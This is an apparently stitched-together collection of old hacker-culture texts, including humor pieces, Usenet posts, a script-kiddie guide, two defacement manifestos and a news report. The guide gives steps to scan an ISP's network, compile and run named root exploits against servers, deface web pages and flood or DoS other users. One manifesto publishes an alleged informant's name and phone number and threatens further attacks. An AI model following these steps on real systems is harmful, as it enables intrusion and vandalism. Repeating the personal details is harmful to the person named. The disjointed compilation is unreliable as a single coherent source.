       If you don't see something close to this then something isn't configured right. Go back through the steps mentioned above and
       see if you typed something wrong.

       I was on the interviewer side of a job interview for the first time a
       few days ago, and in preparation I asked many people for help and
       advice.  I received a set of sample questions from a best friend in a
       previous life.

       Hacker Syndrome Paper

                                 The Hacker Syndrome 
                                    By Tad Deriso 
            
        
       There is some compelling force in all Hackers that seems to draw them 
       to their computers every day.  Why they get up at 4am to use the 
       modem, and why they continue to rack up a truly incredible phone bill 
       is beyond me.  
       
       Most computer areas, at your home or at your office, tend to be messy.  
       Even you try to keep it clean, it is truly impossible.  Whether it be 
       empty Coke cans laying all around, soldering devices, electric diodes, 
       computer parts, or integrated circuits, it is not only a pain for your 
       mother to look at, but a prime Russian ICBM missile target as well.  
       
       There is much detail needed to explain a Hacker.  For instance, 
       instead of organizing his clothes by color, best ones, or style, he 
       organizes his by pile.  Also, he likes to sing songs such as, "Let's 
       get Digital", "We all live in a yellow subroutine", and "Somewhere 
       over the RAMbow".  
       
       Most Hackers do well in school.  The reason is not to impress their 
       teachers, not to get money from their parents, and not to be educated, 
       but they do it so they can hopefully get a scholarship to MIT.  You 
       can't blame them, though, if they are looking out into space.  It 
       might be because they are worried if MCI traced the calls that they 
       sent to NORAD.  
       
       All Hackers, big or small, love computers, whether they be Trash-80's 
       or an IBM 360/VM workstation.  When they get on one, it's mighty hard 
       to get them off of it.  
       
       There are 2 types of Hackers.  One who likes to crash local BBS's, and 
       the one who writes programs in Assembly Language.  The Hacker who 
       crashes systems is the one that most people think that a Hacker is.  A 
       typical example of one is John Fredrickson (A.K.A. "The Phone Man").  
       He loves to crash computers, and break into illegal systems.  The ones 
       that he has gotten in to are MCI, CitiBank, school systems, IBM, 
       Southern Bell, and Georgia Tech, not to mention all the ones in 
       between.  
       
       The second type of Hacker is the programmer.  He writes games, 
       utilities, and anything else that he can think of.  Take for example, 
       John Harris, a freelance software writer for On-Line Software Co.  
       John had a brainstorm one day, and decided to write Frogger for the 
       Apple.  He thought that it would take about 3 weeks to complete.  He 
       started on Frogger a week late, because of the complicated music set 
       that he had to write.  After two months, he was almost done.  He 
       decided to take a break and go to the Software Expo.  He decided to 
       take his nearly completed Frogger, and show it to the consumers at the 
       show.  He also took with him the only back-up copy, in case the main 
       disk did not boot.  
       
       While at the fair, he was talking to the Manager about getting a 
       booth.  He had his disks with him.  Then, when he got a booth 
       reserved, he reached down to get his disks, and they were gone!  All 
       his hard work, including the MultiLevel character generator, music 
       lines, disk subroutines, assembly routines, debugging programs, etc.  
       All gone.  
       
       After that tragedy, John was in a deep depression.  He finally started 
       working on it again in 3 months.  He completed it in 4 months and 3 
       days.  
       
       
       Part Two: 
       
       Hackers always take time off.  There is always one way to notice a 
       true Hacker.  At a party, the true Hacker is the one in the corner 
       talking about operating system security and how to get around it.  At 
       the beach, the True Hacker is the one drawing flow charts in the sand.  
       At a football game, the true Hacker is the one comparing the football 
       plays against a simulation printed on 11 by 14 fanfold paper.  
       
       Most Hackers work for the U.S. Government-- mainly the Department of 
       Defense.  You can see the best Hackers at the Jet Propulsion 
       Laboratory in California.  
       
       What sort of environment does a Hacker function best in?  No, not a 
       heated room with a clean table and disks organized neatly, but they do 
       best in rooms that have line-printed Snoopy calendars from the year 
       1969.  They do not know how to cook, so they survive on Twinkies and 
       coffee.  Instead of wasting electricity for a heater, they spend it on 
       air-conditioners to cool of their computer system in mid-January when 
       the temperatures are below freezing.  They wear layers and layers of 
       clothing to keep the body heat in.  When you see one of these people, 
       instead of a Hacker coming into your mind, you think that he is about 
       to go on a Polar expedition somewhere in the North Pole.  
       
       Hackers also like to hang around arcades.  (This is also true for 
       kids, little old ladies, and fighter pilots.) There, secluded in their 
       own environment, Hackers can talk freely on computer hints and short 
       cuts while playing Pac-Man, or Joust.  
       
       All Hackers like Graphics.  They like low-resolution, but prefer high-
       resolution the best.  These graphics, such as Sine waves, rotating 3-D 
       boxes, and little balloons, are confined to the limits of a systems 
       capability.  The older more experienced Hackers are the ones who are 
       lucky enough to get to work on a VAX system, and maybe even a CRAY-1 
       SuperComputer.  If they use these, they have only the limits of their 
       imagination to stop them.  
       
       Most Middle School Hackers between the ages of 10 through 14, like to 
       use computers to do reports on, and play games.  Some of these younger 
       generation Hackers have gotten into BASIC programming.  
       
       Some people, like to impress real Hackers by making them think that 
       they know everything.  There is a certain name for this kind of 
       person.  He is a Sub-Hacker (Intillectuous dumbfoundeth).  For 
       instance, you come up to them one day, and say,"Hey so-and-so what 
       does BASIC stand for?" and you could sit there for days, and he would 
       act like the answer was on the tip of his tongue, when it was probably 
       in his toes.  It is people like this that give Hackers a bad name.  
       
       
       Part Three: 
       
       All Hackers have certain rules that they go by.  One is to never call 
       long distance on Monday, because of the high phone charge.  Another is 
       If builders built buildings they way programmers wrote programs, the 
       first woodpecker that comes along would destroy civilization.  Another 
       is, if the computer accepts a program on the first run without any 
       errors, either there is a malfunction, or it must be a dream.  
       
       Hackers are a unique breed.  Combining intelligence, personality, and 
       a morale sense of good taste.  A Hacker enjoys the environment that 
       appeals to him the most.  Such as, the computer room, the arcade, 
       science lab, or the Atari downstairs.  They like to be alone.  
       Secluded in their own thoughts, thinking of what the password could be 
       to log on to General Electric.  Hackers are the people who are going 
       to make our future brighter, and more exciting in the field of 
       electronics, data processing, artificial intelligence, and 
       programming.  We need to support these people in all the ways that we 
       can, so we will be insured of a more happier future in the world of 
       technological advancements.

       Organization: UNIX Guru's R Us!
       
       
       HI, EVERYBODY!!!!
       Sorry if this is a FAQ, but I've heard that a FAQ is something
       everybody already knows, but since I don't know the answer to this
       everybody doesn't know it, so it can't be a FAQ, so here I go ...
       
       I've just created about the most Awesome change directory program ever
       written.  If it doesn't find the target directory through an
       exhaustive CDPATH search, it uses the most sophisticated spelling
       corrector (based on a thorough analysis of Webster's on-line
       dictionary, and a list of the 1000 most common directory names on Unix
       systems throughout the world) to try to find a match that way.  If
       that fails, then it tries to create the directory, and if that fails,
       it opens /dev/uri-geller, and reads the mind of the invoker to try to
       figure out what to do.  It executes with almost 0 impact on system
       resources, and is most truly the finest/tightest code ever to grace
       the memory of a computer.
       
       The only problem is that it doesn't work.  No matter how I've tried,
       once I've done that last chdir (and I've tried doing several identical
       chdir(2)'s in a row to see if that would make the directory change
       more "sticky" but that didn't work) I always end up where I started in
       the shell I started my program in.  I've tried setting the PWD, and
       CWD variables with putenv(3), but that doesn't seem to have any effect.
       
       What it really seems to me, is I need some way of telling the shell what
       directory it's supposed to be in when my program is done executing.
       Put more simply, I need a way of modifying the environment of a parent
       process.
       
       E-mail responses only.  There's too much noise on this bboard for me to
       be able to read it.  And HURRY!!!  I need to turn this project in by 5pm
       tonight !!!!

       A Day in the Life of a SysAdmin
       by Thomas Farrell, tfarrell@lynx.dac.neu.edu 
       
       The life of a sysadmin goes approximately as follows. 
       
       8am: Your pager goes off and wakes you up. The message says it's the office, and it's a crisis. You roll out of bed moaning. 
       
       8:15am: You are now sufficiently awake to phone the office. Your pager has gone off three times already. You get through to the office and the receptionist is frantic.
       She says nobody in the entire office can print and they have a major proposal that has to be faxed out before 9am and if it isn't the company could lose a million
       dollars in new business. You try to get her to explain what's wrong, but she's incoherent. 
       
       8:30am: You're dressed in yesterday's dirty clothes (they were all you could find in time) and running out the door, sipping a Jolt cola and hailing a cab to the office. 
       
       8:45am: You arrive at the office. 
       
       8:46am: You determine that the problem is that the printer is turned off, and you turn it back on. 10,000 pages spew out from the hundreds of multiple failed
       attempts by all of your coworkers to print. 
       
       8:47am: Your boss reams you out for "not having fixed that printer problem last time when you said it was all taken care of. You spend the next hour explaining that
       there's nothing you can do to stop people from turning off the printer if they really want to. You don't bother to mention that you happen to know that the person
       who did it is your boss's spouse. 
       
       9:45ish: You finally convince your boss to release you and make your way to your office, assaulted all along the way by people demanding that you must help them
       fix things right now that you know are going to take weeks and really aren't priority. 
       
       10am: You finally arrive at your office and shut and lock the door to keep out the users. You start to read the 40 or so email messages you find waiting every
       morning, which include about 5 new requests, 34 or so messages demanding to know why such and such hasn't gotten done yet, and one message from your boss
       denying your request to have an assistant and demanding that you justify how you spend your time yet again. 
       
       10:30am: You realize that you're never going to finish getting through your email if you keep getting interrupted by these damned telephone calls from the same
       people who sent you the email asking the same questions, so you put your phone on do-not-disturb and go back to your email. 
       
       11am: You've just finished responding to all of your email, including the umpteen millionth justification of your existance for your boss. Unfortunately, the secretary
       has figured out how to order the phone system to override your do-not-disturb on your phone, and is now routing all the angry phone calls from your coworkers to
       you. 
       
       11:30am: You finish talking to everyone on the phone and calming them down. 
       
       11:30am-4:30pm: You work your ass off on whatever projects have the most urgency to the company. Usually this involves a lot of work with software, crawling
       around on the floor several times, tearing a hole in your clothing, and banging your head (hard) on the bottom of a desk. 
       
       3pm: You have your lunch delivered to your office. 
       
       4:30pm: You finally get to touch your lunch, and realize that Burger King french fries do not taste good cold. You're on about your 15th coke since arriving in the
       office. 
       
       4:35pm: Your lunch is over. You're not finished eating, but your boss has just phoned you (he knows how to override the DND on the phone too) and demanded
       that you drop everything and go fix some assinine problem which you know is caused by the user and which you fix every week and which you have warned the user
       about but about which they just don't listen. 
       
       6:30pm: You finish the project your boss set you to and decide to try to sneak out of the office and go home. (Not that you have a social life or anything, but you
       haven't had 8 hours sleep in a month and a half.) In the elevator on the way out of the office you encounter a coworker, who grabs you by the ear and drags you
       back to the office to fix something that's bugging them. 
       
       6:30pm-8pm: Somehow, despite repeated attempts to leave, the moemnt you try to actually do so, someone else appears to force you to work. 
       
       8pm: You're about to depart when you're suddenly informed that there's some vitally urgent data processing that has to be done and that only you know how to do
       and which can't be performed until all of the data entry people have left for the night at 10pm. 
       
       8pm-10pm: You try to nap in your office but the phone keeps ringing so you finally give up and put in several more hours of working. 
       
       10pm: You try to do your data processing but can't because there are still people logged into the data acquisition system. You spend the next fifteen minutes running
       around begging them to log out, and they reply that "yeah, I'll be out in a minute..." 
       
       10:20pm: You get sick of waiting, walk over to the server console, issue commands to kick off all the users, and disable logins. 
       
       10:30pm-2:30am: You perform that data processing which nobody else could do because they won't let you teach them because they know what kind of hours you
       have to put in doing it. 
       
       Midnight: Your blood turns to coca-cola. 
       
       2:30am: You realize that the data processing isn't QUITE done but you're about to pass out so you re-enable logins so you won't get paged about THAT in the
       morning, scrounge a taxi voucher out of your desk (they've given you your own pad because you use them so often), call a taxi, and leave the building. 
       
       2:45am-3:15am: You freeze your ass off waiting for a taxi. 
       
       3:15am-3:30am: The taxi takes you home. The driver seems to have decided to take the scenic route for the hell of it. 
       
       3:31am: You collapse in a heap on your bed and fall asleep face down with your shoes on the pillows and your clothes still on because you're too tired to remove
       your clothes or even orient yourself properly on the bed. 
       
       8:00am: Your pager goes off. 
       
       Repeat ad nauseum until your boss doesn't like your response to one of his "justify your existance" demands and fires you or you die of caffine poisioning. Oh, and
       don't bother factoring in any weekends or holidays: You'll be expected to work those too. 
       
       Now do you have some slight understanding of why I don't like being a sysadmin? I really lived like this for about a year. I'm amazed I survived it.

       ]Our department is considering budgeting a full-time position for a network
       ]administrator.  Likely functions are network support, applications support,
       ]and liaison with computing center.
       
       ]Does anyone have a job description and salary info that might help us budget
       ]such a position?
       
       I am currently on about 35 pages of a job description.  It looks like 50 to 75
       tight pages before completion.
       
       Basically, the description is to know everything about computers, business,
       training, programming and hardware support and do everything, including
       forecast 5-15 years into the future.  Should have at least completed grade
       school equivalency. Have 10 years or more network experience with 20+ years of
       computer experience.  Needs CNE certification.  Be willing to work 24 hours a
       day, 7 days a week.  Must be willing to work for starvation wages and feel
       privileged to be able to work with all of the equipment.  Must be trustworthy,
       honest, kind and above all thrifty.  Must understand overtime is a luxury "we
       can not afford."  Should be able to write 30 pages of documentation for every
       10 minutes of installation work (spending no more than 10 minutes doing this
       documentation).  Requires an even temperament, realizing that the LAN Manager
       is a servant to all, master of none.  Should be able to learn any software
       package in 10 minutes, so as to perform a one day training seminar scheduled
       for NOW.  Must be willing to work in a converted closet with no windows or
       ventilation.  Must be willing to wear a beeper to the bathroom.  Must commit
       to giving a minimum of one year's notice before leaving.
       
       There are more requirements, but that gives the general gist.  Oh and by the
       way because of enlightened management, the salary should be at least 10% over
       minimal beginning secretarial wages.

       /* This , Like the world is only what you perceive it to be */
       
       Q:"How Do I Become A Hacker?"
       A: learn to code , install SunOS , get a SPARC , devote the rest of your
       life to computers and technology
       
       Q: well fuck that I'm lazy , how do i become a script kiddy?
       A: hmm I guess i can show you , whatever you do with this Info is your
       fault not mine...
       
       
       First things first , I am taking it you have Linux installed and a
       conection to the net.  If you are still on Windows* [TM] (C) (R)
       then please look into getting a linux CD-ROM from www.cheapbytes.com
       install linux , setup PPP [if in redhat just startx and use netcfg pussy]
       and come back and read this again ... thanx

       * tools EOF *
       
       
       * general idea *
       Cause as much trouble with the tools you have as posible
       figure out what each tool does and how / why it works
       overall have fun with people and concider yourself better
       than them because you can use teardrop.c to freeze their windows 
       computer or ADMmountd.c to break into their elite red hat 5.1 box
       
       * getting started *
       to get started first you have to be a able to walk ,
       being able to walk is relative to this as being able to move around
       your operating system. if you are "hacking" from a linux box [ YAY ]
       then these commands will help you.
       
       mkdir = creates a dir
       mv = move , rename
       cp = copy
       rm = remove 
       id = shows you who you are
       w  = shows you who's logged in
       tail -f = lets you watch a file as text is added to it in real time 
       echo = add's text to a file 
       cd = changes your directory 
       
       those are some of the basic's now you should be able to get started.
       
       ===============================================================================
       
       HOT TIP: make a dir in your base directory called .anythingsecret
       the . makes it not able to be shown to a regular ls , kind of hides it.
       
       HOT TIP: put all your "hacking" files in that .anythingsecret DIR 
       keep everything clean and in order and it will be a ton easier to keep
       your thoughts 2gether and in the long run you may have more "r00t shellz" 
       
       -----------------------------------------------------------------------------
       "r00t shellz" : in my earlier days i was told by someone who had
       been  on the scene for a long time , longer than i had that "root shells"
       are pretty much what you judge your eliteness on. 
       ------------------------------------------------------------------------------
       
       There are NO rules to being a script kiddy ,
       and NO morlas are enforced upon you ,
       your actions are your actions ,
       and what you see fit to do will always be looked at by others and judged.
       
       ------------------------------------------------------------------------------
       
       I want to..
       A] hack shit now.
       B] get on IRC and learn more before i continue my life as a script kiddy
       C] change my mind and go get a sparc and be a real haxor
       
       if you said A then you have the mentality it takes to be a true script
       kiddy and im not going to hold you back any longer .. lets get started on
       talking about how to break into those krad red hat systems...
       
       If you just want to hack ANY computer on any network
       then i suggest just letting your Security Scanner scan
       for a long time and then picking the computers out of your 
       scanners log file that look like you would be able to gain access to the
       easiest. [ mountd / named / imap ] 
       
       If you are using SSCAN (tm) JSBACH, and are ready to hack some shit NOW.
       then start SSCAN running on some small town ISP..
       
       ie:
       home@linux# ./sscan localisp.com/24 >> hot.list &
       
       
       once the scanning has completed then use your favorite word editor [PICO@#%]
       and read the file.. look for where SSCAN has told you that a server is
       mountd/imap/or named overflowable.. and then just try all the servers
       listed with the exploit that it is listed for... surely after a while one
       will work.. even the sun shines on a cluebie script kiddy's ass some day.
       
       [ gcc -o rotshb rotshb.c ]
       ./rotshb server.com 4 1
       
       [ gcc -o mountd ADMmountd.c ]
       ./mountd server.com
       
       [ gcc -o imapk1ller imapexploit.c ]
       ./imapk1ller host.com offset
       
       you will now when your exploit worked and when you have root ,
       and you will probally get a funny little feeling , kind of an exited
       feeling that will be your motovation to do this again.. 
       
       now once you have root you are ready for the beef of a script kiddys
       life....
       
       changing HTML.. a script kiddy changes HTML in many ways for many
       reasons.. the funnier hacks i have seen are hacks that are supose to be
       serious in which script kiddys voice their opinions on varios things ..
       from the soup at school not tasting good to the government just any
       opinion that they have in thier little brains .. 
       
       [ find / -name index.html ]
       root@hackedbox# echo " i own you " >> /home/httpd/html/index.html
       
       now that you have defaced your first web page , get on IRC and brag about
       it , as a script kiddy its something that you HAVE to do.. 
       
       load up BitchX and your War Script [ Civic.bx ] and head on over to
       TeenChat on EFNET.. scroll the URL to the page you just "hacked" and if
       anyone says anything negative to you say " Shut Up Bitch I Own You "
       and nuke them with /teardrop or any other elite d.o.s alias your war
       script may have.. you are now on your way to being a super ereet script
       kiddy.. by now you have probally allready caused a stir in the underground
       and JP from AntiOnline.com is going to interview you because you hacked
       the first jewish server that was ever ran off linux .. and now the pope
       thinks you are the anti-christ and has been talking about you as an evil
       haxer all week on the news.. JP see's a chance to exploit you and make
       money off your teen ignorance and does so in a gracefull manor.
       
       now your ego is larger then your IQ ,
       you know how to root a server ,
       you know how to D.o.S anyone on IRC ,
       you are confident ,
       you are clueless ,
       you think you are a god ,
       you have younger want to be script kiddys worshiping you ,
       you are in the pinacle of your script kiddy life ,
       
       now take your ICQ flooders / bombers and herass everyone on your ICQ list
       for no obvious reason..
       
       you are now a Script Kiddy .. enjoy your new life of stupidity...
       
       in about a year you will realize that being a script kiddy is nothing but
       a waste of time.. and sure you have learnt your way around linux like a
       small town with only once street to pick up hookers , but you still have a
       long way to go before you are corprate material.. and once you decide
       computers are your dream and thats what you want to do for the rest of
       your life you notice that you wasted the last year and a half  being a
       script kiddy .. inflating your teen ego .. hurting lil web servers for no
       reason other than the thrill of the hack.. heh

         Several sites were cracked in support of hacker/cracker Jason Mewhiney
         who recently 'defaced' a nasa website.
         
         The page's message is archived on HNN...

          * See archive for further details     
                          
                          Brother Mandalo explains: 
                          

        On April 1st, 1998, Jason Mewhiney was arrested by the RCMP for allegedly
       defacing the NASA web page: http://www.hq.nasa.gov. This arrest was originally
      attributed by the press to a 3 year investigation by the RCMP/FBI. Nothing could
      be further by the t ruth. In actual truth, this arrest was the result of hearsay coming
       from a 20 year old paid informant by the name of Nick Potkay (whose phone #
      incidentally is: (203) 746-0734). It's nice that the FBI can make arrests in Canada
        based upon the word of a socially inept kid such as Nicholas Potkay isn't it? 

        This is your wake up call, we are making a declaration of war against all who
       would challenge the freedom of Canadians with such ludicrous actions! We have
       broken into your phone companies, your breweries; everything you hold sacred!
         And we will contin ue to defile corporate Canadian privacy until the bullshit
           agendas of the Yanks are cast aside and realized for what they are! 

             Let us examine for just a moment the bullshit tactics of NASA:

       The hack done at Nasa was merely a change to ONE file in the html directory,
       index.html and NASA claims it took over 200 man hours for them to correct this
      situation. Are we to believe that it takes 200 hours for a team of NASA employees
      to reinstall one computer and re-install the contents of that box from tape backup?
       These numbers are totally arbitrary. If these numbers are accurate, then it is not
        so difficult to imagine how a tragedy such as the Challenger explosion could
                                 occur! 

      Your friendly neighbourhood "rocket scientists" at NASA are obviously fabricating
       these numbers in order to get the FBI to pursue Jason Mewhiney. Seventy-four
       thousand dollars to issue a couple of commands and replace the altered page?
      The calculators at NASA must have the zero key stuck or something. Seventy-four
       dollars perhaps, but seventy-four thousand? The painful reality is this:Jason is
      obviously a scapegoat for NASA's inability to secure their so called "critical" web
                                  site.

                Finally, some parting words from Brother Mandabarb:

      And so we come to an end of our diatribe. I hope you have enjoyed our spectacle.
       Remember -- in the future, question what your read. But most of all, phear -- For
                       the Yorkshire Posse hath arrived.


       The original site that got hacked had these words on it: (NASA. 1998)
       
       (H4G1S > NASA)


       Gr33t1ngs fr0m th3 m3mb3rs 0f H4G1S.
       
       Our mission is to continue where our colleagues the ILF left off. During the next month, we the members of H4G1S, will be launching an attack on corporate
       America. All who profit from the misuse of the internet will fall victim to our upcoming reign of digital terrorism.
       
       Our privileged and highly skilled members will stop at nothing until our presence is felt nationwide. 
       
       Even your most sophisticated firewalls are useless. We will demonstrate this in the upcoming weeks. 
       
                         THE COMMERCIALIZATION OF THE INTERNET STOPS HERE
       
       
       
       KEVIN MITNICK IS CURRENTLY IMPRISONED FOR NOTHING MORE THEN HIS CURIOUSITY AND DESIRE TO LEARN. KEVIN HAS BEEN
       ROTTING IN A PRISON CELL FOR 2 YEARS AND STILL HASN'T GONE TO TRIAL.
       
       ED CUMMINGS WAS THROWN IN PRISON FOR POSSESSING NOTHING OTHER THAN A COUPLE PIECES OF ELECTRONICS FROM
       RADIO SHACK. HIS COUNTRY DESTROYED HIS LIFE. WHILE IN PRISON CUMMINGS WAS SUBJECTED TO POOR PRISON CONDITIONS
       AND TREATED AS IF HE WERE A MURDERER. 
       
       The injustice doesn't just end with Kevin Mitnick, there are others who have been targets of the government. Ed Cummings (aka BernieS) went to Prison for
       possessing a timing crystal (used in various el ectronic devices and can be purchased at Radio Shack) along with a Tone Dialer (also obtainable at Radio Shack). If
       you put these two things together in the right way, it is possible to use this device to trick the phone company into believing that you inserted a quarter into a
       payphone. Mr. Cummings never had these parts combined, and therefore never commited any crime. But NO, the government said he commited a crime, and what
       happens? He goes to prison because they say so. It wasn't hard to see th at things were going wrong for Mr. Cummings. A person being charged with man slaughter
       got bail set substantially lower then Mr. Cummings. Is itjust me or does that sound ridiculous? 
       
       
       You can blame us
       Make every attempt to detain us
       You can make laws for us to break
       And "secure" your data for us to take
       A hacker, not by trade, but by BIRTHRIGHT.
       
       Some are born White, Some are born Black
       But the chaos chooses no c olor
       The chaos that encompasses our lives, all of our lives
       Driving us to HACK
       Deep inside, past the media, past the government, past ALL THE BULLSHIT:
       WE ARE ALL HACKERS
       
       Once it has you it never lets go.
       The conspiracy that saps our freedom, our humanity, our stability and security
       The self-propagating fruitless cycle that can only end by force
       If we must end this ourselves, we will stop at nothing
       This is a cry to America to GET IN TOUCH with the hacker inside YOU
       Take a step back and look around
       How much longer must my brothers suffer, for crimes subjectively declared ILLEGAL.
       
       All these fucking inbreds in office
       Stealing money from the coun try
       Writing bills to reduce your rights
       As the country just overlooks it
       PEOPLE OF AMERICA:
       IT'S TIME TO FIGHT.
       
       And FIGHT we WILL
       In the streets and from our homes
       In cyberspace and through the phones
       They are winning, by crushing our will
       Through this farce we call the media
       Through this farce we call capitalism
       Through this farce we call the JUSTICE SYSTEM
       Tell BernieS and Kevin Mitnick about Justice
       
       This is one strike, in what will soon become *MANY* 
       For those of you at home, now, reading this, we ask you
       Please, not for Hagis, Not for your country, but for YOURSELF
       FIGHT THE WHITE DOG OPRESSOR
       Amen.

       Canadian hackers attack 13 major corporate sites
       By Tom Diederich
                                             
       Several major corporate Web sites apparently were hacked into last Sunday
       evening by a group called the Yorkshire Posse. 
                                             
       The group said 13 companies were targeted to protest the arrest last April
       of Canadian Jason Mewhiney, who is suspected of breaking into a NASA Web
       site and causing tens of thousands of dollars in damage. 
       
       
       "I think they went for us because we were a high-profile site," said Sara
       Winge, a spokeswoman for information technology publisher O'Reilly &
       Associates Inc. in Sebastopol, Calif., one of the sites that was hit.
       "They were trying to get a message across about a Canadian hacker -- or
       cracker, I guess I should say -- who was being tried for computer crimes.
       But it didn't have anything to do with O'Reilly as a company." 
       
       
       The hacked sites were replaced with a page that proclaimed a "declaration
       of war against all who would challenge the freedom of Canadians with such
       ludicrous actions!" 
       
       
       The group claimed to have also hit Playboy.com, Sonymusic.com and a Sun
       Microsystems Inc. customer support site in Canada. Officials from those
       companies weren't available for comment at press time. 
       
       
       Winge said O'Reilly was contacting the other 12 sites to learn how the
       attacks were carried out. "We obviously can't give a lot of detail, but we
       have prevented it from reoccurring at this point," she said. 
       
       
       "All of our electronic-commerce offerings are on another server, which was
       not at all touched and has much heavier security," Winge added. 
       
       
       She said the attack occurred late Sunday night and was fixed by 9 a.m. 
       Monday morning.
